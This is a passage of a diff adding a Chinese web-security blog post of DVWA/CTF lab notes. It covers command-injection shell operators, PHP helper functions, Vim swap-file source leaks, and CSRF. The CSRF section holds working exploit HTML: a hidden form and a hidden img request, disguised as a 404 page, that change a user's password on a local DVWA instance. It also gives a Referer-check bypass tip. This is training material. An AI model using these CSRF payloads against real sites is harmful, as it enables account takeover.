$stmt-&gt;rowCount();</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>掌握几个 shell 技巧：|、||、&amp;、&amp;&amp;</p>
+<p>| 管道符号：前面的输出作为后面的输入</p>
+<p>|| 前面执行失败才执行后面的语句</p>
+<p>&amp; 后台执行：配合 fg、bg</p>
+<p>&amp;&amp; 前面执行成功才执行后面的语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">stristr();	&#x2F;&#x2F;	Case-insensitive 的 strstr();</span><br><span class="line">echo stristr(&#39;USER@EXAMPLE.com&#39;, &#39;e&#39;);	&#x2F;&#x2F;	outputs ER@EXAMPLE.com</span><br><span class="line"></span><br><span class="line">array_keys();	&#x2F;&#x2F;	Return all the keys or a subset of the keys of an array</span><br><span class="line">$array &#x3D; array(0 &#x3D;&gt; 100, &quot;color&quot; &#x3D;&gt; &quot;red&quot;);</span><br><span class="line">print_r(array_keys($array));</span><br><span class="line">&#x2F;&#x2F;output</span><br><span class="line">&#x2F;&#x2F;Array</span><br><span class="line">&#x2F;&#x2F;(</span><br><span class="line">&#x2F;&#x2F;    [0] &#x3D;&gt; 0</span><br><span class="line">&#x2F;&#x2F;    [1] &#x3D;&gt; color</span><br><span class="line">&#x2F;&#x2F;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str_replace();	&#x2F;&#x2F;	Replace all occurrences of the search string with the replacement string</span><br><span class="line">&#x2F;&#x2F;	Provides: Hll Wrld f PHP</span><br><span class="line">$vowels &#x3D; array(&quot;a&quot;, &quot;e&quot;, &quot;i&quot;, &quot;o&quot;, &quot;u&quot;, &quot;A&quot;, &quot;E&quot;, &quot;I&quot;, &quot;O&quot;, &quot;U&quot;);</span><br><span class="line">$onlyconsonants &#x3D; str_replace($vowels, &quot;&quot;, &quot;Hello World of PHP&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Split the IP into 4 octects，类似 python 的 .split()</span><br><span class="line">$octet &#x3D; explode( &quot;.&quot;, $target );</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Cross-Site-Request-Forgery-CSRF"><a href="#Cross-Site-Request-Forgery-CSRF" class="headerlink" title="Cross Site Request Forgery (CSRF)"></a>Cross Site Request Forgery (CSRF)</h2><p>csrf 要和 xss 一起运用才能实现一些危险系数高的攻击。</p>
+<p>exp（Low Level）（注意这里有一个坑，非常建议本地建一个 web 服务然后再打开 exp ，本地直接打开的话第二个 exp 不会成功，反正我这里是试了半天没成功。其次还要注意一下浏览器缓存的问题）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- border 边框，style=&quot;display:none;&quot; 让其不显示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eregi(string pattern, string string)</span><br><span class="line">检查 string 中是否含有 pattern（不区分大小写），如果有返回 True，反之 False</span><br><span class="line">eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] )</span><br><span class="line">用此方法防御的 csrf 可用文件名包含 server_name 攻击</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h4 id="Vim缓存导致的网页源码泄漏"><a href="#Vim缓存导致的网页源码泄漏" class="headerlink" title="Vim缓存导致的网页源码泄漏"></a>Vim缓存导致的网页源码泄漏</h4><blockquote>
+<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。<br>文件名一般为<code>.index.php.swp</code>。</p>
+</blockquote>
+<p>Link</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/v1vvwv/p/DVWA-SQL-Injection.html">https://www.cnblogs.com/v1vvwv/p/DVWA-SQL-Injection.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Catalog"><span class="toc-number">1.</span> <span class="toc-text">Catalog</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E4%B8%ADPOC%E3%80%81EXP%E3%80%81Payload%E4%B8%8EShellcode%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.0.0.0.0.1.</span> <span class="toc-text">渗透中POC、EXP、Payload与Shellcode的区别</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection"><span class="toc-number">1.1.</span> <span class="toc-text">SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%91%8B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">👋手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0-%E4%BF%AE%E6%94%B9%E8%A1%A8%E7%9A%84%E7%BB%93%E6%9E%84%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%EF%BC%88-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E6%96%B9%E6%B3%95%E4%B9%8B%E4%B8%80%EF%BC%89"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">堆叠+修改表的结构进行注入（[强网杯 2019]随便注方法之一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HANDLER%E8%AF%AD%E5%8F%A5%E6%B3%A8%E5%85%A5%EF%BC%88-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E6%96%B9%E6%B3%95%E4%B9%8B%E4%B8%80%EF%BC%89"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">HANDLER语句注入（[强网杯 2019]随便注方法之一）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%9Ahttps-www-jianshu-com-p-4fe931da9550"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">宽字节注入：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;4fe931da9550</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">1.2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Site-Request-Forgery-CSRF"><span class="toc-number">1.4.</span> <span class="toc-text">Cross Site Request Forgery (CSRF)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.5.</span> <span class="toc-text">其他</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Vim%E7%BC%93%E5%AD%98%E5%AF%BC%E8%87%B4%E7%9A%84%E7%BD%91%E9%A1%B5%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">Vim缓存导致的网页源码泄漏</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&text=WEB_本职工作(持续更新)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&is_video=false&description=WEB_本职工作(持续更新)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WEB_本职工作(持续更新)&body=Check out this article: http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&title=WEB_本职工作(持续更新)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&name=WEB_本职工作(持续更新)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/02/14/WEB-ctf%E8%AE%B0%E5%BD%95/&t=WEB_本职工作(持续更新)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
